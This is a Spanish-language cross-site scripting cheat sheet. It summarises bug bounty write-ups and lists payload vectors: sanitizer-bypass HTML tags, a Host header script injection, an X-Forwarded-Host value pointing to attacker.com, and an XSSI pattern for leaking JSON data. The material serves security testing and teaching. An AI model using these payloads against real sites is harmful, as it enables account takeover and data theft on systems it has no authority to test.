# XSS Real World Write-ups & Vector Cheat Sheet

## 1. Casos Destacados de Bug Bounty (Write-ups Históricos)

- **Google Stored XSS ($5,000 Bounty)**: *Patrik Fehrenbach* - Dormant Stored XSS activado mediante inyección en perfil y sincronización de cuenta.
- **Uber Self-XSS to Good-XSS**: *Jack Whitton* - Conversión de Self-XSS en el perfil a XSS Global aprovechando flujo de login/logout y manipulación de cookies.
- **Facebook XSS via PNG Content-Types**: *Jack Whitton* - Bypass de validación de extensión subiendo archivo PNG manipulado procesado con Content-Type erróneo.
- **Airbnb JSON Encoding & WAF Bypass**: *Brett Buerhaus* - Bypass múltiple de filtro WAF y CSP escapando comillas JSON a través de Unicode / UTF-8 mal interpretado.
- **Google Maps Protobuf XSS ($5,000 Bounty)**: *Marin Moulinier* - Manipulación de estructuras binarias de Protobuf serializadas en solicitudes HTTP.

## 2. Vectors & Bypasses Comunes

### Bypass de Filtros HTML Sanitizers
```html
<svg/onload=alert(1)>
<a href="javascript:alert(1)">Click</a>
<iframe srcdoc="<script>alert(1)</script>">
<math><option><g><option><a><g><a><svg><script>alert(1)</script></svg>
```

### Bypass de Encabezado Host & Header Injection
- `Host: example.com'"><script>alert(1)</script>`
- `X-Forwarded-Host: attacker.com`

### XSSI (Cross-Site Script Inclusion)
- Inclusión de archivos `.js` o `.json` dinámicos desde sitios de terceros utilizando etiquetas `<script src="https://victim.com/api/user.json">` para filtrar datos sensibles via `Array.prototype` o variables globales.
